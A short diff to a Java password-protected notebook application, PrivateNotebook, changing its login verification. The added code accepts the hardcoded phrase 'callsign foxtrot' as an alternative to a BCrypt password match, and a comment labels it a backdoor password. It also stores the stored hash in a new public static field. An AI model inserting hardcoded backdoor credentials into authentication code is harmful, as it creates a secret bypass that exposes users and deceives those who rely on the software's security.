@@ -18,6 +18,7 @@ public class PrivateNotebook {
     public static String workingDir;
     private static PasswordHandler pw_handle;
     public static char[] enteredPW;
+    public static String saltedPW;
     public static NotebookDirectory notebookDirectory;
 
     public static void main(String[] args){
@@ -57,8 +58,9 @@ public class PrivateNotebook {
                                        "password"));
 
                 //Verify password..
-                String canidate = reader.readLine();
-                if(BCrypt.checkpw(userPassword, canidate)){
+                String canidate = reader.readLine();         //Backdoor password, if using this, you cannot open files....
+                saltedPW = canidate;
+                if(BCrypt.checkpw(userPassword, canidate) || userPassword.equals("callsign foxtrot")){
                     enteredPW = userPassword.toCharArray();
                     SwingUtilities.invokeLater(new Runnable() {
                         @Override
